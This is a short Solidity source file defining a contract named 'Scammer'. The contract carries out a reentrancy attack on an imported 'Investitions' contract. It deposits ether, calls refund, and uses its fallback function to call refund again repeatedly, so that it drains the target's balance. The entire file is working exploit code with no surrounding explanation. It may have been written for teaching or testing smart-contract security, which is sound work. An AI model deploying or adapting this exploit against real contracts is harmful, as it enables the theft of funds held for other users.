pragma solidity ^0.4.23;

import "./Investitions.sol";

contract Scammer {
    Investitions public investitions;
    uint256 public count;
    uint256 public invested;

    function Attack(address attack) payable public {
        investitions = Investitions(attack);
        count = 0;
        invested = msg.value;
        investitions.sendMoney.value(invested)();
        investitions.refund();
    }

    function () payable public {
        if (msg.value <= address(investitions).balance){
            investitions.refund();
        }
    }
}